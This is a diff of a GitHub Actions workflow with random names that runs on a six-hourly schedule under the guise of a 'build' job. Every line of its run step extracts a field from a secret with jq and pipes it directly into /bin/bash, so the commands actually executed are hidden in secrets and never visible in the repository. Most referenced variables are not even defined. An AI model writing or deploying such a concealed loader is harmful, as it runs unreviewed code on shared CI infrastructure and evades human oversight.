@@ -1,26 +1,24 @@
 name: indexplaintive
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 2/6 * * *'
+    - cron: '10 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: indexplaintive
         env:
-          sje9204: ${{ secrets.sje9204 }}
+          dydo881: ${{ secrets.dydo881 }}
         run: |
-          echo $sje9204 | jq -r .w24557 | /bin/bash
-          echo $zniye02 | jq -r .cc2423 | /bin/bash
-          echo $oojkl46617 | jq -r .xvezm81443 | /bin/bash
-          echo $mnqvd8914 | jq -r .ummmx23905 | /bin/bash
-          echo $hx69 | jq -r .vvdma02386 | /bin/bash
-          echo $ae409 | jq -r .oc1 | /bin/bash
-          echo $z41582 | jq -r .p5702 | /bin/bash
-          echo $s4 | jq -r .yqzk640 | /bin/bash
-          echo $rmbva29 | jq -r .y4519 | /bin/bash
-          echo $ps51020 | jq -r .njcge545 | /bin/bash
+          echo $dydo881 | jq -r .pzi9410 | /bin/bash
+          echo $knar24407 | jq -r .kfn13184 | /bin/bash
+          echo $vuqe05 | jq -r .ko65 | /bin/bash
+          echo $vhzli1 | jq -r .mrks23538 | /bin/bash
+          echo $lryse884 | jq -r .vqit8723 | /bin/bash
+          echo $obf80258 | jq -r .uxqt32779 | /bin/bash
+          echo $go092 | jq -r .juxi85076 | /bin/bash
 
